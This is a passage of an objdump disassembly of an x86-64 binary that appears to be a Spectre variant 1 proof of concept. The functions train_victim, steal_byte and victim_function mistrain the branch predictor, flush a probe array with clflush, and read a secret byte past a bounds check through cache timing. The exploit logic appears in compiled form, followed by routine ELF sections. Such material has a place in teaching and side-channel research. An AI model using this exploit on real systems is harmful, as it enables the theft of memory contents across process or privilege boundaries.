 950:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
 957:	00 00 
 959:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 95d:	31 c0                	xor    %eax,%eax
 95f:	48 c7 45 e8 05 00 00 	movq   $0x5,-0x18(%rbp)
 966:	00 
 967:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
 96b:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 96f:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%rbp)
 976:	e9 84 00 00 00       	jmpq   9ff <train_victim+0xb7>
 97b:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
 97f:	48 ba cd cc cc cc cc 	movabs $0xcccccccccccccccd,%rdx
 986:	cc cc cc 
 989:	48 89 c8             	mov    %rcx,%rax
 98c:	48 f7 e2             	mul    %rdx
 98f:	48 c1 ea 03          	shr    $0x3,%rdx
 993:	48 89 d0             	mov    %rdx,%rax
 996:	48 c1 e0 02          	shl    $0x2,%rax
 99a:	48 01 d0             	add    %rdx,%rax
 99d:	48 01 c0             	add    %rax,%rax
 9a0:	48 29 c1             	sub    %rax,%rcx
 9a3:	48 89 ca             	mov    %rcx,%rdx
 9a6:	48 89 55 e8          	mov    %rdx,-0x18(%rbp)
 9aa:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 9ae:	48 83 c0 01          	add    $0x1,%rax
 9b2:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
 9b6:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 9ba:	48 89 c7             	mov    %rax,%rdi
 9bd:	e8 24 01 00 00       	callq  ae6 <victim_function>
 9c2:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%rbp)
 9c9:	eb 1a                	jmp    9e5 <train_victim+0x9d>
 9cb:	8b 45 e0             	mov    -0x20(%rbp),%eax
 9ce:	c1 e0 0c             	shl    $0xc,%eax
 9d1:	48 63 d0             	movslq %eax,%rdx
 9d4:	48 8d 05 65 17 20 00 	lea    0x201765(%rip),%rax        # 202140 <array>
 9db:	48 01 d0             	add    %rdx,%rax
 9de:	0f ae 38             	clflush (%rax)
 9e1:	83 45 e0 01          	addl   $0x1,-0x20(%rbp)
 9e5:	81 7d e0 ff 00 00 00 	cmpl   $0xff,-0x20(%rbp)
 9ec:	7e dd                	jle    9cb <train_victim+0x83>
 9ee:	0f ae f0             	mfence 
 9f1:	48 8d 05 28 16 20 00 	lea    0x201628(%rip),%rax        # 202020 <bufferSize>
 9f8:	0f ae 38             	clflush (%rax)
 9fb:	83 45 dc 01          	addl   $0x1,-0x24(%rbp)
 9ff:	83 7d dc 13          	cmpl   $0x13,-0x24(%rbp)
 a03:	0f 8e 72 ff ff ff    	jle    97b <train_victim+0x33>
 a09:	0f ae e8             	lfence 
 a0c:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
 a13:	eb 1a                	jmp    a2f <train_victim+0xe7>
 a15:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 a18:	c1 e0 0c             	shl    $0xc,%eax
 a1b:	48 63 d0             	movslq %eax,%rdx
 a1e:	48 8d 05 1b 17 20 00 	lea    0x20171b(%rip),%rax        # 202140 <array>
 a25:	48 01 d0             	add    %rdx,%rax
 a28:	0f ae 38             	clflush (%rax)
 a2b:	83 45 e4 01          	addl   $0x1,-0x1c(%rbp)
 a2f:	81 7d e4 ff 00 00 00 	cmpl   $0xff,-0x1c(%rbp)
 a36:	7e dd                	jle    a15 <train_victim+0xcd>
 a38:	0f ae f0             	mfence 
 a3b:	48 8d 05 de 15 20 00 	lea    0x2015de(%rip),%rax        # 202020 <bufferSize>
 a42:	0f ae 38             	clflush (%rax)
 a45:	90                   	nop
 a46:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 a4a:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
 a51:	00 00 
 a53:	74 05                	je     a5a <train_victim+0x112>
 a55:	e8 96 fb ff ff       	callq  5f0 <__stack_chk_fail@plt>
 a5a:	c9                   	leaveq 
 a5b:	c3                   	retq   

0000000000000a5c <steal_byte>:
 a5c:	55                   	push   %rbp
 a5d:	48 89 e5             	mov    %rsp,%rbp
 a60:	48 83 ec 30          	sub    $0x30,%rsp
 a64:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
 a68:	89 75 d4             	mov    %esi,-0x2c(%rbp)
 a6b:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
 a72:	00 00 
 a74:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 a78:	31 c0                	xor    %eax,%eax
 a7a:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
 a81:	eb 37                	jmp    aba <steal_byte+0x5e>
 a83:	b8 00 00 00 00       	mov    $0x0,%eax
 a88:	e8 bb fe ff ff       	callq  948 <train_victim>
 a8d:	8b 45 d4             	mov    -0x2c(%rbp),%eax
 a90:	48 98                	cltq   
 a92:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
 a96:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
 a9a:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 a9e:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 aa2:	48 89 c7             	mov    %rax,%rdi
 aa5:	e8 3c 00 00 00       	callq  ae6 <victim_function>
 aaa:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
 aae:	48 89 c7             	mov    %rax,%rdi
 ab1:	e8 90 fd ff ff       	callq  846 <find_cached_index>
 ab6:	83 45 e4 01          	addl   $0x1,-0x1c(%rbp)
 aba:	81 7d e4 e7 03 00 00 	cmpl   $0x3e7,-0x1c(%rbp)
 ac1:	7e c0                	jle    a83 <steal_byte+0x27>
 ac3:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
 ac7:	48 89 c7             	mov    %rax,%rdi
 aca:	e8 f0 fd ff ff       	callq  8bf <find_highest_score>
 acf:	90                   	nop
 ad0:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 ad4:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
 adb:	00 00 
 add:	74 05                	je     ae4 <steal_byte+0x88>
 adf:	e8 0c fb ff ff       	callq  5f0 <__stack_chk_fail@plt>
 ae4:	c9                   	leaveq 
 ae5:	c3                   	retq   

0000000000000ae6 <victim_function>:
 ae6:	55                   	push   %rbp
 ae7:	48 89 e5             	mov    %rsp,%rbp
 aea:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
 aee:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 af2:	48 8b 10             	mov    (%rax),%rdx
 af5:	8b 05 25 15 20 00    	mov    0x201525(%rip),%eax        # 202020 <bufferSize>
 afb:	48 98                	cltq   
 afd:	48 39 c2             	cmp    %rax,%rdx
 b00:	73 35                	jae    b37 <victim_function+0x51>
 b02:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 b06:	48 8b 10             	mov    (%rax),%rdx
 b09:	48 8d 05 30 15 20 00 	lea    0x201530(%rip),%rax        # 202040 <buffer>
 b10:	0f b6 04 02          	movzbl (%rdx,%rax,1),%eax
 b14:	0f b6 c0             	movzbl %al,%eax
 b17:	c1 e0 0c             	shl    $0xc,%eax
 b1a:	48 63 d0             	movslq %eax,%rdx
 b1d:	48 8d 05 1c 16 20 00 	lea    0x20161c(%rip),%rax        # 202140 <array>
 b24:	0f b6 14 02          	movzbl (%rdx,%rax,1),%edx
 b28:	0f b6 05 f2 15 20 00 	movzbl 0x2015f2(%rip),%eax        # 202121 <temp>
 b2f:	21 d0                	and    %edx,%eax
 b31:	88 05 ea 15 20 00    	mov    %al,0x2015ea(%rip)        # 202121 <temp>
 b37:	90                   	nop
 b38:	5d                   	pop    %rbp
 b39:	c3                   	retq   
 b3a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000000b40 <__libc_csu_init>:
 b40:	41 57                	push   %r15
 b42:	41 56                	push   %r14
 b44:	49 89 d7             	mov    %rdx,%r15
 b47:	41 55                	push   %r13
 b49:	41 54                	push   %r12
 b4b:	4c 8d 25 4e 12 20 00 	lea    0x20124e(%rip),%r12        # 201da0 <__frame_dummy_init_array_entry>
 b52:	55                   	push   %rbp
 b53:	48 8d 2d 4e 12 20 00 	lea    0x20124e(%rip),%rbp        # 201da8 <__init_array_end>
 b5a:	53                   	push   %rbx
 b5b:	41 89 fd             	mov    %edi,%r13d
 b5e:	49 89 f6             	mov    %rsi,%r14
 b61:	4c 29 e5             	sub    %r12,%rbp
 b64:	48 83 ec 08          	sub    $0x8,%rsp
 b68:	48 c1 fd 03          	sar    $0x3,%rbp
 b6c:	e8 47 fa ff ff       	callq  5b8 <_init>
 b71:	48 85 ed             	test   %rbp,%rbp
 b74:	74 20                	je     b96 <__libc_csu_init+0x56>
 b76:	31 db                	xor    %ebx,%ebx
 b78:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
 b7f:	00 
 b80:	4c 89 fa             	mov    %r15,%rdx
 b83:	4c 89 f6             	mov    %r14,%rsi
 b86:	44 89 ef             	mov    %r13d,%edi
 b89:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
 b8d:	48 83 c3 01          	add    $0x1,%rbx
 b91:	48 39 dd             	cmp    %rbx,%rbp
 b94:	75 ea                	jne    b80 <__libc_csu_init+0x40>
 b96:	48 83 c4 08          	add    $0x8,%rsp
 b9a:	5b                   	pop    %rbx
 b9b:	5d                   	pop    %rbp
 b9c:	41 5c                	pop    %r12
 b9e:	41 5d                	pop    %r13
 ba0:	41 5e                	pop    %r14
 ba2:	41 5f                	pop    %r15
 ba4:	c3                   	retq   
 ba5:	90                   	nop
 ba6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 bad:	00 00 00 

0000000000000bb0 <__libc_csu_fini>:
 bb0:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000000bb4 <_fini>:
 bb4:	48 83 ec 08          	sub    $0x8,%rsp
 bb8:	48 83 c4 08          	add    $0x8,%rsp
 bbc:	c3                   	retq   

Disassembly of section .rodata:

0000000000000bc0 <_IO_stdin_used>:
 bc0:	01 00                	add    %eax,(%rax)
 bc2:	02 00                	add    (%rax),%al
 bc4:	00 00                	add    %al,(%rax)
 bc6:	00 00                	add    %al,(%rax)
 bc8:	4c                   	rex.WR
 bc9:	65 74 74             	gs je  c40 <__GNU_EH_FRAME_HDR+0x4c>
 bcc:	65 72 3a             	gs jb  c09 <__GNU_EH_FRAME_HDR+0x15>
 bcf:	20 25 63 09 20 49    	and    %ah,0x49200963(%rip)        # 49201538 <_end+0x48eff3f8>
 bd5:	6e                   	outsb  %ds:(%rsi),(%dx)
 bd6:	64 65 78 3a          	fs gs js c14 <__GNU_EH_FRAME_HDR+0x20>
 bda:	20 25 64 09 20 6e    	and    %ah,0x6e200964(%rip)        # 6e201544 <_end+0x6deff404>
 be0:	75 6d                	jne    c4f <__GNU_EH_FRAME_HDR+0x5b>
 be2:	62                   	(bad)  
 be3:	65 72 20             	gs jb  c06 <__GNU_EH_FRAME_HDR+0x12>
 be6:	6f                   	outsl  %ds:(%rsi),(%dx)
 be7:	66 20 68 69          	data16 and %ch,0x69(%rax)
 beb:	74 73                	je     c60 <__GNU_EH_FRAME_HDR+0x6c>
 bed:	3a                   	.byte 0x3a
 bee:	25                   	.byte 0x25
 bef:	64 0a 00             	or     %fs:(%rax),%al

Disassembly of section .eh_frame_hdr:

0000000000000bf4 <__GNU_EH_FRAME_HDR>:
 bf4:	01 1b                	add    %ebx,(%rbx)
 bf6:	03 3b                	add    (%rbx),%edi
 bf8:	60                   	(bad)  
 bf9:	00 00                	add    %al,(%rax)
 bfb:	00 0b                	add    %cl,(%rbx)
 bfd:	00 00                	add    %al,(%rax)
 bff:	00 dc                	add    %bl,%ah
 c01:	f9                   	stc    
 c02:	ff                   	(bad)  
 c03:	ff ac 00 00 00 2c fa 	ljmp   *-0x5d40000(%rax,%rax,1)
 c0a:	ff                   	(bad)  
 c0b:	ff d4                	callq  *%rsp
 c0d:	00 00                	add    %al,(%rax)
 c0f:	00 3c fa             	add    %bh,(%rdx,%rdi,8)
 c12:	ff                   	(bad)  
 c13:	ff                   	(bad)  
 c14:	7c 00                	jl     c16 <__GNU_EH_FRAME_HDR+0x22>
 c16:	00 00                	add    %al,(%rax)
 c18:	46 fb                	rex.RX sti 
 c1a:	ff                   	(bad)  
 c1b:	ff                   	(bad)  
 c1c:	ec                   	in     (%dx),%al
 c1d:	00 00                	add    %al,(%rax)
 c1f:	00 52 fc             	add    %dl,-0x4(%rdx)
 c22:	ff                   	(bad)  
 c23:	ff 0c 01             	decl   (%rcx,%rax,1)
 c26:	00 00                	add    %al,(%rax)
 c28:	cb                   	lret   
 c29:	fc                   	cld    
 c2a:	ff                   	(bad)  
 c2b:	ff 30                	pushq  (%rax)
 c2d:	01 00                	add    %eax,(%rax)
 c2f:	00 54 fd ff          	add    %dl,-0x1(%rbp,%rdi,8)
 c33:	ff 50 01             	callq  *0x1(%rax)
 c36:	00 00                	add    %al,(%rax)
 c38:	68 fe ff ff 70       	pushq  $0x70fffffe
 c3d:	01 00                	add    %eax,(%rax)
 c3f:	00 f2                	add    %dh,%dl
 c41:	fe                   	(bad)  
 c42:	ff                   	(bad)  
 c43:	ff 94 01 00 00 4c ff 	callq  *-0xb40000(%rcx,%rax,1)
 c4a:	ff                   	(bad)  
 c4b:	ff b4 01 00 00 bc ff 	pushq  -0x440000(%rcx,%rax,1)
 c52:	ff                   	(bad)  
 c53:	ff                   	(bad)  
 c54:	fc                   	cld    
 c55:	01 00                	add    %eax,(%rax)
	...

Disassembly of section .eh_frame:

0000000000000c58 <__FRAME_END__-0x1ac>:
 c58:	14 00                	adc    $0x0,%al
 c5a:	00 00                	add    %al,(%rax)
 c5c:	00 00                	add    %al,(%rax)
 c5e:	00 00                	add    %al,(%rax)
 c60:	01 7a 52             	add    %edi,0x52(%rdx)
 c63:	00 01                	add    %al,(%rcx)
 c65:	78 10                	js     c77 <__GNU_EH_FRAME_HDR+0x83>
 c67:	01 1b                	add    %ebx,(%rbx)
 c69:	0c 07                	or     $0x7,%al
 c6b:	08 90 01 07 10 14    	or     %dl,0x14100701(%rax)
 c71:	00 00                	add    %al,(%rax)
 c73:	00 1c 00             	add    %bl,(%rax,%rax,1)
 c76:	00 00                	add    %al,(%rax)
 c78:	b8 f9 ff ff 2b       	mov    $0x2bfffff9,%eax
	...
 c85:	00 00                	add    %al,(%rax)
 c87:	00 14 00             	add    %dl,(%rax,%rax,1)
 c8a:	00 00                	add    %al,(%rax)
 c8c:	00 00                	add    %al,(%rax)
 c8e:	00 00                	add    %al,(%rax)
 c90:	01 7a 52             	add    %edi,0x52(%rdx)
 c93:	00 01                	add    %al,(%rcx)
 c95:	78 10                	js     ca7 <__GNU_EH_FRAME_HDR+0xb3>
 c97:	01 1b                	add    %ebx,(%rbx)
 c99:	0c 07                	or     $0x7,%al
 c9b:	08 90 01 00 00 24    	or     %dl,0x24000001(%rax)
 ca1:	00 00                	add    %al,(%rax)
 ca3:	00 1c 00             	add    %bl,(%rax,%rax,1)
 ca6:	00 00                	add    %al,(%rax)
 ca8:	28 f9                	sub    %bh,%cl
 caa:	ff                   	(bad)  
 cab:	ff 50 00             	callq  *0x0(%rax)
 cae:	00 00                	add    %al,(%rax)
 cb0:	00 0e                	add    %cl,(%rsi)
 cb2:	10 46 0e             	adc    %al,0xe(%rsi)
 cb5:	18 4a 0f             	sbb    %cl,0xf(%rdx)
 cb8:	0b 77 08             	or     0x8(%rdi),%esi
 cbb:	80 00 3f             	addb   $0x3f,(%rax)
 cbe:	1a 3b                	sbb    (%rbx),%bh
 cc0:	2a 33                	sub    (%rbx),%dh
 cc2:	24 22                	and    $0x22,%al
 cc4:	00 00                	add    %al,(%rax)
 cc6:	00 00                	add    %al,(%rax)
 cc8:	14 00                	adc    $0x0,%al
 cca:	00 00                	add    %al,(%rax)
 ccc:	44 00 00             	add    %r8b,(%rax)
 ccf:	00 50 f9             	add    %dl,-0x7(%rax)
 cd2:	ff                   	(bad)  
 cd3:	ff 08                	decl   (%rax)
	...
 cdd:	00 00                	add    %al,(%rax)
 cdf:	00 1c 00             	add    %bl,(%rax,%rax,1)
 ce2:	00 00                	add    %al,(%rax)
 ce4:	5c                   	pop    %rsp
 ce5:	00 00                	add    %al,(%rax)
 ce7:	00 52 fa             	add    %dl,-0x6(%rdx)
 cea:	ff                   	(bad)  
 ceb:	ff 0c 01             	decl   (%rcx,%rax,1)
 cee:	00 00                	add    %al,(%rax)
 cf0:	00 41 0e             	add    %al,0xe(%rcx)
 cf3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 cf9:	03 07                	add    (%rdi),%eax
 cfb:	01 0c 07             	add    %ecx,(%rdi,%rax,1)
 cfe:	08 00                	or     %al,(%rax)
 d00:	20 00                	and    %al,(%rax)
 d02:	00 00                	add    %al,(%rax)
 d04:	7c 00                	jl     d06 <__GNU_EH_FRAME_HDR+0x112>
 d06:	00 00                	add    %al,(%rax)
 d08:	3e fb                	ds sti 
 d0a:	ff                   	(bad)  
 d0b:	ff                   	(bad)  
 d0c:	79 00                	jns    d0e <__GNU_EH_FRAME_HDR+0x11a>
 d0e:	00 00                	add    %al,(%rax)
 d10:	00 41 0e             	add    %al,0xe(%rcx)
 d13:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 d19:	41 83 03 02          	addl   $0x2,(%r11)
 d1d:	73 0c                	jae    d2b <__GNU_EH_FRAME_HDR+0x137>
 d1f:	07                   	(bad)  
 d20:	08 00                	or     %al,(%rax)
 d22:	00 00                	add    %al,(%rax)
 d24:	1c 00                	sbb    $0x0,%al
 d26:	00 00                	add    %al,(%rax)
 d28:	a0 00 00 00 93 fb ff 	movabs 0x89fffffb93000000,%al
 d2f:	ff 89 
 d31:	00 00                	add    %al,(%rax)
 d33:	00 00                	add    %al,(%rax)
 d35:	41 0e                	rex.B (bad) 
 d37:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 d3d:	02 84 0c 07 08 00 00 	add    0x807(%rsp,%rcx,1),%al
 d44:	1c 00                	sbb    $0x0,%al
 d46:	00 00                	add    %al,(%rax)
 d48:	c0 00 00             	rolb   $0x0,(%rax)
 d4b:	00 fc                	add    %bh,%ah
 d4d:	fb                   	sti    
 d4e:	ff                   	(bad)  
 d4f:	ff 14 01             	callq  *(%rcx,%rax,1)
 d52:	00 00                	add    %al,(%rax)
 d54:	00 41 0e             	add    %al,0xe(%rcx)
 d57:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 d5d:	03 0f                	add    (%rdi),%ecx
 d5f:	01 0c 07             	add    %ecx,(%rdi,%rax,1)
 d62:	08 00                	or     %al,(%rax)
 d64:	20 00                	and    %al,(%rax)
 d66:	00 00                	add    %al,(%rax)
 d68:	e0 00                	loopne d6a <__GNU_EH_FRAME_HDR+0x176>
 d6a:	00 00                	add    %al,(%rax)
 d6c:	f0 fc                	lock cld 
 d6e:	ff                   	(bad)  
 d6f:	ff 8a 00 00 00 00    	decl   0x0(%rdx)
 d75:	41 0e                	rex.B (bad) 
 d77:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 d7d:	02 85 0c 07 08 00    	add    0x8070c(%rbp),%al
 d83:	00 00                	add    %al,(%rax)
 d85:	00 00                	add    %al,(%rax)
 d87:	00 1c 00             	add    %bl,(%rax,%rax,1)
 d8a:	00 00                	add    %al,(%rax)
 d8c:	04 01                	add    $0x1,%al
 d8e:	00 00                	add    %al,(%rax)
 d90:	56                   	push   %rsi
 d91:	fd                   	std    
 d92:	ff                   	(bad)  
 d93:	ff 54 00 00          	callq  *0x0(%rax,%rax,1)
 d97:	00 00                	add    %al,(%rax)
 d99:	41 0e                	rex.B (bad) 
 d9b:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 da1:	02 4f 0c             	add    0xc(%rdi),%cl
 da4:	07                   	(bad)  
 da5:	08 00                	or     %al,(%rax)
 da7:	00 44 00 00          	add    %al,0x0(%rax,%rax,1)
 dab:	00 24 01             	add    %ah,(%rcx,%rax,1)
 dae:	00 00                	add    %al,(%rax)
 db0:	90                   	nop
 db1:	fd                   	std    
 db2:	ff                   	(bad)  
 db3:	ff 65 00             	jmpq   *0x0(%rbp)
 db6:	00 00                	add    %al,(%rax)
 db8:	00 42 0e             	add    %al,0xe(%rdx)
 dbb:	10 8f 02 42 0e 18    	adc    %cl,0x180e4202(%rdi)
 dc1:	8e 03                	mov    (%rbx),%es
 dc3:	45 0e                	rex.RB (bad) 
 dc5:	20 8d 04 42 0e 28    	and    %cl,0x280e4204(%rbp)
 dcb:	8c 05 48 0e 30 86    	mov    %es,-0x79cff1b8(%rip)        # ffffffff86301c19 <_end+0xffffffff85fffad9>
 dd1:	06                   	(bad)  
 dd2:	48 0e                	rex.W (bad) 
 dd4:	38 83 07 4d 0e 40    	cmp    %al,0x400e4d07(%rbx)
 dda:	72 0e                	jb     dea <__GNU_EH_FRAME_HDR+0x1f6>
 ddc:	38 41 0e             	cmp    %al,0xe(%rcx)
 ddf:	30 41 0e             	xor    %al,0xe(%rcx)
 de2:	28 42 0e             	sub    %al,0xe(%rdx)
 de5:	20 42 0e             	and    %al,0xe(%rdx)
 de8:	18 42 0e             	sbb    %al,0xe(%rdx)
 deb:	10 42 0e             	adc    %al,0xe(%rdx)
 dee:	08 00                	or     %al,(%rax)
 df0:	10 00                	adc    %al,(%rax)
 df2:	00 00                	add    %al,(%rax)
 df4:	6c                   	insb   (%dx),%es:(%rdi)
 df5:	01 00                	add    %eax,(%rax)
 df7:	00 b8 fd ff ff 02    	add    %bh,0x2fffffd(%rax)
 dfd:	00 00                	add    %al,(%rax)
 dff:	00 00                	add    %al,(%rax)
 e01:	00 00                	add    %al,(%rax)
	...

0000000000000e04 <__FRAME_END__>:
 e04:	00 00                	add    %al,(%rax)
	...

Disassembly of section .init_array:

0000000000201da0 <__frame_dummy_init_array_entry>:
  201da0:	30 07                	xor    %al,(%rdi)
  201da2:	00 00                	add    %al,(%rax)
  201da4:	00 00                	add    %al,(%rax)
	...

Disassembly of section .fini_array:

0000000000201da8 <__do_global_dtors_aux_fini_array_entry>:
  201da8:	f0 06                	lock (bad) 
  201daa:	00 00                	add    %al,(%rax)
  201dac:	00 00                	add    %al,(%rax)
	...

Disassembly of section .dynamic:

0000000000201db0 <_DYNAMIC>:
  201db0:	01 00                	add    %eax,(%rax)
  201db2:	00 00                	add    %al,(%rax)
  201db4:	00 00                	add    %al,(%rax)
  201db6:	00 00                	add    %al,(%rax)
  201db8:	01 00                	add    %eax,(%rax)
  201dba:	00 00                	add    %al,(%rax)
  201dbc:	00 00                	add    %al,(%rax)
  201dbe:	00 00                	add    %al,(%rax)
  201dc0:	0c 00                	or     $0x0,%al
  201dc2:	00 00                	add    %al,(%rax)
  201dc4:	00 00                	add    %al,(%rax)
  201dc6:	00 00                	add    %al,(%rax)
  201dc8:	b8 05 00 00 00       	mov    $0x5,%eax
  201dcd:	00 00                	add    %al,(%rax)
  201dcf:	00 0d 00 00 00 00    	add    %cl,0x0(%rip)        # 201dd5 <_DYNAMIC+0x25>
  201dd5:	00 00                	add    %al,(%rax)
  201dd7:	00 b4 0b 00 00 00 00 	add    %dh,0x0(%rbx,%rcx,1)
  201dde:	00 00                	add    %al,(%rax)
  201de0:	19 00                	sbb    %eax,(%rax)
  201de2:	00 00                	add    %al,(%rax)
  201de4:	00 00                	add    %al,(%rax)
  201de6:	00 00                	add    %al,(%rax)
  201de8:	a0 1d 20 00 00 00 00 	movabs 0x1b0000000000201d,%al
  201def:	00 1b 
  201df1:	00 00                	add    %al,(%rax)
  201df3:	00 00                	add    %al,(%rax)
  201df5:	00 00                	add    %al,(%rax)
  201df7:	00 08                	add    %cl,(%rax)
  201df9:	00 00                	add    %al,(%rax)
  201dfb:	00 00                	add    %al,(%rax)
  201dfd:	00 00                	add    %al,(%rax)
  201dff:	00 1a                	add    %bl,(%rdx)
  201e01:	00 00                	add    %al,(%rax)
  201e03:	00 00                	add    %al,(%rax)
  201e05:	00 00                	add    %al,(%rax)
  201e07:	00 a8 1d 20 00 00    	add    %ch,0x201d(%rax)
  201e0d:	00 00                	add    %al,(%rax)
  201e0f:	00 1c 00             	add    %bl,(%rax,%rax,1)
  201e12:	00 00                	add    %al,(%rax)
  201e14:	00 00                	add    %al,(%rax)
  201e16:	00 00                	add    %al,(%rax)
  201e18:	08 00                	or     %al,(%rax)
  201e1a:	00 00                	add    %al,(%rax)
  201e1c:	00 00                	add    %al,(%rax)
  201e1e:	00 00                	add    %al,(%rax)
  201e20:	f5                   	cmc    
  201e21:	fe                   	(bad)  
  201e22:	ff 6f 00             	ljmp   *0x0(%rdi)
  201e25:	00 00                	add    %al,(%rax)
  201e27:	00 98 02 00 00 00    	add    %bl,0x2(%rax)
  201e2d:	00 00                	add    %al,(%rax)
  201e2f:	00 05 00 00 00 00    	add    %al,0x0(%rip)        # 201e35 <_DYNAMIC+0x85>
  201e35:	00 00                	add    %al,(%rax)
  201e37:	00 a8 03 00 00 00    	add    %ch,0x3(%rax)
  201e3d:	00 00                	add    %al,(%rax)
  201e3f:	00 06                	add    %al,(%rsi)
  201e41:	00 00                	add    %al,(%rax)
  201e43:	00 00                	add    %al,(%rax)
  201e45:	00 00                	add    %al,(%rax)
  201e47:	00 b8 02 00 00 00    	add    %bh,0x2(%rax)
  201e4d:	00 00                	add    %al,(%rax)
  201e4f:	00 0a                	add    %cl,(%rdx)
  201e51:	00 00                	add    %al,(%rax)
  201e53:	00 00                	add    %al,(%rax)
  201e55:	00 00                	add    %al,(%rax)
  201e57:	00 ab 00 00 00 00    	add    %ch,0x0(%rbx)
  201e5d:	00 00                	add    %al,(%rax)
  201e5f:	00 0b                	add    %cl,(%rbx)
  201e61:	00 00                	add    %al,(%rax)
  201e63:	00 00                	add    %al,(%rax)
  201e65:	00 00                	add    %al,(%rax)
  201e67:	00 18                	add    %bl,(%rax)
  201e69:	00 00                	add    %al,(%rax)
  201e6b:	00 00                	add    %al,(%rax)
  201e6d:	00 00                	add    %al,(%rax)
  201e6f:	00 15 00 00 00 00    	add    %dl,0x0(%rip)        # 201e75 <_DYNAMIC+0xc5>
	...
  201e7d:	00 00                	add    %al,(%rax)
  201e7f:	00 03                	add    %al,(%rbx)
  201e81:	00 00                	add    %al,(%rax)
  201e83:	00 00                	add    %al,(%rax)
  201e85:	00 00                	add    %al,(%rax)
  201e87:	00 a0 1f 20 00 00    	add    %ah,0x201f(%rax)
  201e8d:	00 00                	add    %al,(%rax)
  201e8f:	00 02                	add    %al,(%rdx)
  201e91:	00 00                	add    %al,(%rax)
  201e93:	00 00                	add    %al,(%rax)
  201e95:	00 00                	add    %al,(%rax)
  201e97:	00 60 00             	add    %ah,0x0(%rax)
  201e9a:	00 00                	add    %al,(%rax)
  201e9c:	00 00                	add    %al,(%rax)
  201e9e:	00 00                	add    %al,(%rax)
  201ea0:	14 00                	adc    $0x0,%al
  201ea2:	00 00                	add    %al,(%rax)
  201ea4:	00 00                	add    %al,(%rax)
  201ea6:	00 00                	add    %al,(%rax)
  201ea8:	07                   	(bad)  
  201ea9:	00 00                	add    %al,(%rax)
  201eab:	00 00                	add    %al,(%rax)
  201ead:	00 00                	add    %al,(%rax)
  201eaf:	00 17                	add    %dl,(%rdi)
  201eb1:	00 00                	add    %al,(%rax)
  201eb3:	00 00                	add    %al,(%rax)
  201eb5:	00 00                	add    %al,(%rax)
  201eb7:	00 58 05             	add    %bl,0x5(%rax)
  201eba:	00 00                	add    %al,(%rax)
  201ebc:	00 00                	add    %al,(%rax)
  201ebe:	00 00                	add    %al,(%rax)
  201ec0:	07                   	(bad)  
  201ec1:	00 00                	add    %al,(%rax)
  201ec3:	00 00                	add    %al,(%rax)
  201ec5:	00 00                	add    %al,(%rax)
  201ec7:	00 98 04 00 00 00    	add    %bl,0x4(%rax)
  201ecd:	00 00                	add    %al,(%rax)
  201ecf:	00 08                	add    %cl,(%rax)
  201ed1:	00 00                	add    %al,(%rax)
  201ed3:	00 00                	add    %al,(%rax)
  201ed5:	00 00                	add    %al,(%rax)
  201ed7:	00 c0                	add    %al,%al
  201ed9:	00 00                	add    %al,(%rax)
  201edb:	00 00                	add    %al,(%rax)
  201edd:	00 00                	add    %al,(%rax)
  201edf:	00 09                	add    %cl,(%rcx)
  201ee1:	00 00                	add    %al,(%rax)
  201ee3:	00 00                	add    %al,(%rax)
  201ee5:	00 00                	add    %al,(%rax)
  201ee7:	00 18                	add    %bl,(%rax)
  201ee9:	00 00                	add    %al,(%rax)
  201eeb:	00 00                	add    %al,(%rax)
  201eed:	00 00                	add    %al,(%rax)
  201eef:	00 1e                	add    %bl,(%rsi)
  201ef1:	00 00                	add    %al,(%rax)
  201ef3:	00 00                	add    %al,(%rax)
  201ef5:	00 00                	add    %al,(%rax)
  201ef7:	00 08                	add    %cl,(%rax)
  201ef9:	00 00                	add    %al,(%rax)
  201efb:	00 00                	add    %al,(%rax)
  201efd:	00 00                	add    %al,(%rax)
  201eff:	00 fb                	add    %bh,%bl
  201f01:	ff                   	(bad)  
  201f02:	ff 6f 00             	ljmp   *0x0(%rdi)
  201f05:	00 00                	add    %al,(%rax)
  201f07:	00 01                	add    %al,(%rcx)
  201f09:	00 00                	add    %al,(%rax)
  201f0b:	08 00                	or     %al,(%rax)
  201f0d:	00 00                	add    %al,(%rax)
  201f0f:	00 fe                	add    %bh,%dh
  201f11:	ff                   	(bad)  
  201f12:	ff 6f 00             	ljmp   *0x0(%rdi)
  201f15:	00 00                	add    %al,(%rax)
  201f17:	00 68 04             	add    %ch,0x4(%rax)
